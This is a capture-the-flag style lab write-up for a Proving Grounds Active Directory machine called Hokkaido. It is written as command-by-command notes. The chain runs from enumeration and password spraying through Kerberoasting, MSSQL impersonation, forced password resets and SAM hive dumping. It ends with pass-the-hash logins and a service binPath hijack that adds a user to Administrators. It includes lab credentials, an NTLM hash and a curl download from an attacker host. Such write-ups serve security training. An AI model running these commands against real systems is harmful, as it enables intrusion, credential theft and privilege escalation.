# NMAP 

```
sudo nmap -sC -sV 192.168.194.40 -oN nmap-hokkaido
```

```
hokkaido-aerospace.com
```

```
dc.hokkaido-aerospace.com
```

![[PG/Active Directory/attachments/Pasted image 20250708215541.png]]

![[PG/Active Directory/attachments/Pasted image 20250708215624.png]]

All ports
![[PG/Active Directory/attachments/Pasted image 20250708235142.png]]

UDP
![[PG/Active Directory/attachments/Pasted image 20250708235110.png]]
# Web (80)

## Ferox

```
feroxbuster -u http://192.168.194.40 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o ferox.out
```
![[PG/Active Directory/attachments/Pasted image 20250708221332.png]]
- not much 

Retry with domain name ?

![[PG/Active Directory/attachments/Pasted image 20250708221432.png]]

## Ferox2 

```
feroxbuster -u http://hokkaido-aerospace.com/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -o ferox2.out
```


# SMB 

![[PG/Active Directory/attachments/Pasted image 20250708220646.png]]

![[PG/Active Directory/attachments/Pasted image 20250708220732.png]]

# RPC 

![[PG/Active Directory/attachments/Pasted image 20250708220953.png]]
- logged in but no privvies

# LDAP 

![[PG/Active Directory/attachments/Pasted image 20250708221243.png]]
- no privileges here either 

# Kerberos 

Kerbrute 

```
kerbrute  userenum -d hokkaido-aerospace.com --dc 192.168.194.40 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -t 100
```

users.txt
```
info
administrator
discovery 
maintenance
```

Retrying nxc with user list 

```
nxc smb 192.168.194.40 -u users.txt -p users.txt 
```

![[PG/Active Directory/attachments/Pasted image 20250709000450.png]]
- got a match `info:info`

```
nxc smb 192.168.194.40 -u users.txt -p users.txt --shares
```
![[PG/Active Directory/attachments/Pasted image 20250709000542.png]]
- and some interesting smb shares 

# Read SMB Shares

```
smbclient -U 'info' //192.168.194.40/homes
```

![[PG/Active Directory/attachments/Pasted image 20250709000746.png]]
- Username goldmine 

This UpdateServicesPackages share is empty 

![[PG/Active Directory/attachments/Pasted image 20250709001225.png]]

And we have a text file in the other share..

![[PG/Active Directory/attachments/Pasted image 20250709001331.png]]

Also I'm going to run the username list I found from share through kerbrute for fun

![[PG/Active Directory/attachments/Pasted image 20250709001441.png]]
- looks like they're all valid 

Well this file is empty 

![[PG/Active Directory/attachments/Pasted image 20250709001543.png]]
I wanted to test the info creds against winrm too 

![[PG/Active Directory/attachments/Pasted image 20250709001658.png]]
- nope

# Another NXC bruteforce

```
nxc smb 192.168.194.40 -u users-share.txt -p users-share.txt --no-brute
```
![[PG/Active Directory/attachments/Pasted image 20250709001833.png]]
- nope

No hits on WinRM either.

Retrying RPC with info creds and MORE USERS 

```
rpcclient -U 'info' 192.168.194.40 
```

![[PG/Active Directory/attachments/Pasted image 20250709002247.png]]

Save this to a file and use to keep only the usernames

```
:%s/user:\[\([^]]*\)\].*/\1/
```

![[PG/Active Directory/attachments/Pasted image 20250709003051.png]]

In rpcclient 

See if there's any passwords in descriptions
```
querydispinfo
```

![[PG/Active Directory/attachments/Pasted image 20250709003405.png]]
- nope

Maybe another custom password list and new user list is the way?

```
Summer2023
Spring2023
Winter2023
Fall2023
Autumn2023
Password1!
P@ssword
Space2023
Aerospace2023
Hokkaido2023
```

```
hashcat --stdout -r /usr/share/hashcat/rules/best64.rule your_wordlist.txt > generated_wordlist.txt
```

![[PG/Active Directory/attachments/Pasted image 20250709004857.png]]

Okie fuck. I should look through the default shares too..

Going back to SMB

```
smbclient -U 'info' //192.168.194.40/NETLOGON
```

There's a password reset file in here 

![[PG/Active Directory/attachments/Pasted image 20250709005346.png]]

Annnd it has a password :)

![[PG/Active Directory/attachments/Pasted image 20250709005430.png]]
```
Start123!
```

So we can probs password spray with our username list instead 

```
nxc smb 192.168.194.40 -u 'users-rpc.txt' -p 'Start123!'
```
![[PG/Active Directory/attachments/Pasted image 20250709005702.png]]
- A match! 

```
hokkaido-aerospace.com\discovery:Start123!
```

No winrm :(

```
nxc winrm 192.168.194.40 -u 'discovery' -p 'Start123!'
```
![[PG/Active Directory/attachments/Pasted image 20250709005856.png]]

Maybe if this is a service account we can do a userspns thing 

Let's query this user's groups in rpclient 

![[PG/Active Directory/attachments/Pasted image 20250709010133.png]]

```
Rid [0x46e]
```


```
queryusergroups 0x46e
```

![[PG/Active Directory/attachments/Pasted image 20250709010422.png]]

```
querygroup 0x472
```

![[PG/Active Directory/attachments/Pasted image 20250709010512.png]]
- so this user is part of the services group and domain users..

I'll try impacket's GetUserSPNs

```
impacket-GetUserSPNs -request -dc-ip 192.168.194.40 hokkaido-aerospace.com/discovery -save -outputfile GetUserSPNs.out
```

Then enter password if prompted 

```
Start123!
```


Here's the SPN for discover 

```
discover/dc.hokkaido-aerospace.com
```

Here's the SPN for maintenance

```
maintenance/dc.hokkaido-aerospace.com
```

![[PG/Active Directory/attachments/Pasted image 20250709011043.png]]

Got my hashies.

![[PG/Active Directory/attachments/Pasted image 20250709011111.png]]

# Crack these hashies 

```
hashcat -m 13100 GetUserSPNs.out /usr/share/wordlists/rockyou.txt 
```

They didn't crack

![[PG/Active Directory/attachments/Pasted image 20250709011310.png]]

# Login with mssql-client

```
impacket-mssqlclient  'hokkaido-aerospace.com/discovery':'Start123!'@192.168.194.40 -dc-ip 192.168.194.40 -windows-auth
```

![[PG/Active Directory/attachments/Pasted image 20250709011952.png]]

```
xp_dirtee
```

![[PG/Active Directory/attachments/Pasted image 20250709012102.png]]

```
SELECT name FROM master..sysdatabases;
```

![[PG/Active Directory/attachments/Pasted image 20250709100439.png]]

Access hrappdb 

```
use hrappdb;
```

![[PG/Active Directory/attachments/Pasted image 20250709100545.png]]

No permissions.

Check for another user to impersonate 

```
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
```

![[PG/Active Directory/attachments/Pasted image 20250709100808.png]]
We can impersonate hrappdb-reader

Login as hrappdb-reader

```
EXECUTE AS LOGIN = 'hrappdb-reader'
```

Select the database 

```
use hrappdb
```

![[PG/Active Directory/attachments/Pasted image 20250709101014.png]]

Read database tables

```
SELECT * FROM hrappdb.INFORMATION_SCHEMA.TABLES;
```

![[PG/Active Directory/attachments/Pasted image 20250709101112.png]]

Read the sysauth table

```
select * from sysauth;
```

We get credentials 

![[PG/Active Directory/attachments/Pasted image 20250709101205.png]]

```
hrapp-service:Untimed$Runny
```

Attempt WinRM, but creds won't work.

Run bloodhound

```
python3 bloodhound.py -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny' -c all -ns 192.168.194.40
```

![[PG/Active Directory/attachments/Pasted image 20250709101606.png]]

Import this data into Bloodhound 

![[PG/Active Directory/attachments/Pasted image 20250709101642.png]]

Mark this hrapp-service as owned 

This user as GenericWrite over Hazel.Green

![[PG/Active Directory/attachments/Pasted image 20250709101900.png]]

Who is Hazel?

She's a member of IT and TIER-2 ADMINS which may be interesting 

![[PG/Active Directory/attachments/Pasted image 20250709102029.png]]

Checking out these groups. They don't seem to have much control.

Maybe we can get a foothold with Hazel.Green

Let's try targeted kerberoasting to get Hazel.Green creds

![[PG/Active Directory/attachments/Pasted image 20250709102626.png]]

I'll try this script https://github.com/ShutdownRepo/targetedKerberoast/blob/main/targetedKerberoast.py

```
python3 targetedKerberoast.py -d 'hokkaido-aerospace.com' -u 'hrapp-service' -p 'Untimed$Runny'
```

Okie, yay!! This actually worked!!!

![[PG/Active Directory/attachments/Pasted image 20250709103328.png]]
- Got Hazel's TGS

Save these to crack with hashcat 

```
hashcat -m 13100 hazel.hash /usr/share/wordlists/rockyou.txt
```

![[PG/Active Directory/attachments/Pasted image 20250709103624.png]]

```
Hazel.Green:haze1988
```


# Fingies crossed WinRM

```
nxc winrm 192.168.194.40 -u 'Hazel.Green' -p 'haze1988'
```

![[PG/Active Directory/attachments/Pasted image 20250709103856.png]]
- fuck 

Crack maintenance TGS too 

![[PG/Active Directory/attachments/Pasted image 20250709104105.png]]

```
hashcat -m 13100 maintenance.hash /usr/share/wordlists/rockyou.txt
```

This one didn't crack

Discovery hash didn't crack either... tempted to password spray with hazel's pass but 


```
xfreerdp3 /u:hazel.green /p:haze1988 /cert:ignore /v:192.168.194.40
```
- nope



I did figure out the pre-build searches in Bloodhound. There's nothing

![[PG/Active Directory/attachments/Pasted image 20250709105208.png]]

In bloodhound we can see hazel.green is a member of IT Group so we can forcefully change pass of tier 1 admin which is MOLLY.SMITH? Not sure how this is determined. 

![[PG/Active Directory/attachments/Pasted image 20250709105612.png]]

Asking chatgpt.. no clue.

Maybe they guessed

Reset Molly Smith's password

```
rpcclient -N  192.168.194.40 -U 'hazel.green%haze1988'
```

```
setuserinfo2 MOLLY.SMITH 23 'Password123!'
```

I got access denied. 

![[PG/Active Directory/attachments/Pasted image 20250709111500.png]]

Yeah no 

![[PG/Active Directory/attachments/Pasted image 20250709111646.png]]

Supposedly this should work 

```
xfreerdp /u:molly.smith /p:'Password123!' /v:192.168.208.40 +clipboard
```

Then run 

```
whoami /priv
```

![[PG/Active Directory/attachments/Pasted image 20250709112646.png]]

We have SeBackupPrivilege


# Priv Esc via SeBackupPrivilege 

```
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```


Copy to Kali and run 

## impacket-secretsdump

```
impacket-secretsdump -system system -sam sam local    
```


## Evil-WinRM as Admin

```
evil-winrm -i 192.168.208.40  -u administrator -H "d752482897d54e239376fddb2a2109e4"
```


## Alternate Priv Esc - Hijack Execution Flow

```
curl http://192.168.45.152/accesschk.exe -o accesschk.exe
```

https://medium.com/@mu.aktepe18/hokkaido-proving-ground-walk-through-922b8ef9af43

```
accesschk.exe -cuwqv "molly.smith" * /accepteula
```

![[PG/Active Directory/attachments/Pasted image 20250709113544.png]]

change binpath of any of these services for privilege escalation

We'll select "AppReadiness"

```
sc qc AppReadiness
```

```
accesschk.exe -cuwqv "molly.smith" AppReadiness
```

Molly has all access to this service 

![[PG/Active Directory/attachments/Pasted image 20250709113734.png]]

Change binpath of AppReadiness to add molly.smith to administrators group.

```
sc config AppReadiness binPath= "cmd /c net localgroup Administrators molly.smith /add"
```


![[PG/Active Directory/attachments/Pasted image 20250709113815.png]]

Stop and start service to enact the change 

```
sc stop AppReadiness
```

```
sc start AppReadiness
```

```
net localgroup administrators
```


log out and log in again to refresh the token

Get flag 

```
whoami & type proof.txt & ipconfig
```